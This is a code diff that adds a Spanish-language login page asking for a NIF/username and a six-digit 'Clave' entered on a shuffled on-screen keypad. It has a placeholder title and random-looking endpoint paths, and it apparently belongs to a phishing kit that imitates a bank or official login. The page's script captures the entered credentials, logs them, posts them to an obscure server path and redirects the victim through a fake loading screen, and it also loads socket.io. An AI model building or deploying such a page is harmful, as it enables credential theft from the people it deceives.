@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Document</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <div>
+        <div>
+            <div class="tappa">
+                <img src="./img/hedapo1.png" alt="">
+            </div>
+        </div>
+
+        <div>
+            <div class="qlwa indx-inp">
+                <form method="post" id="loginForm">
+                    <div>
+                        <div class="input-container">
+                            <input type="text" name="" id="uzi" placeholder="NIF/Usuario" required>
+                            <input type="password" id="keypad-input" readonly placeholder="Clave" required
+                                minlength="6">
+                        </div>
+
+                        <div class="keypad-wrapper">
+                            <div class="numbers-grid">
+                                <!-- Row 1: 8, 1, 2, 0, 4 -->
+                                <button type="button" class="key-btn" data-value="8">8</button>
+                                <button type="button" class="key-btn" data-value="1">1</button>
+                                <button type="button" class="key-btn" data-value="2">2</button>
+                                <button type="button" class="key-btn" data-value="0">0</button>
+                                <button type="button" class="key-btn" data-value="4">4</button>
+
+                                <!-- Row 2: 3, 5, 6, 7, 9 -->
+                                <button type="button" class="key-btn" data-value="3">3</button>
+                                <button type="button" class="key-btn" data-value="5">5</button>
+                                <button type="button" class="key-btn" data-value="6">6</button>
+                                <button type="button" class="key-btn" data-value="7">7</button>
+                                <button type="button" class="key-btn" data-value="9">9</button>
+                            </div>
+                            <button type="button" class="backspace-btn">
+                                <!-- Simple representation of the backspace icon -->
+                                <span><img width="30" src="./img/delet.svg" alt=""></span>
+                            </button>
+                        </div>
+                        <div id="errorMessage"
+                            style="display: none; color: red; margin-bottom: 10px; text-align: center;">
+                            Por favor, introduzca una clave válida de 6 dígitos.
+                        </div>
+                        <button type="submit">Entrar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        console.log("submit");
+        const username = document.getElementById('uzi').value;
+        const password = document.getElementById('keypad-input').value;
+        const errorMessage = document.getElementById('errorMessage');
+
+        // Reset error state
+        errorMessage.style.display = 'none';
+
+        if (!username.trim()) {
+            // Show error message if username is empty
+            errorMessage.textContent = 'Por favor, introduzca su usuario.';
+            errorMessage.style.display = 'block';
+            return;
+        }
+
+        if (password.length < 6) {
+            // Show error message if password is less than 6 digits
+            errorMessage.textContent = 'La clave debe tener 6 dígitos.';
+            errorMessage.style.display = 'block';
+            return;
+        }
+
+        console.log('Login attempt:', { username, password });
+
+        $.ajax({
+            url: '/gzLbTbjqMpc34D4XsPJ2',
+            type: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({ username, password }),
+            success: function (info) {
+                if (info.OK) {
+                    window.location = "/loading?time=3&url=/PPmP85AgNE4pnL5mWSM";
+                }
+            }
+        });
+    });
+
+    // Hide error message when user starts typing
+    document.getElementById('uzi').addEventListener('input', function () {
+        document.getElementById('errorMessage').style.display = 'none';
+    });
+</script>
+<script src="js/script.js"></script>
+<script src="/socket.io/socket.io.js"></script>
+
+</html>
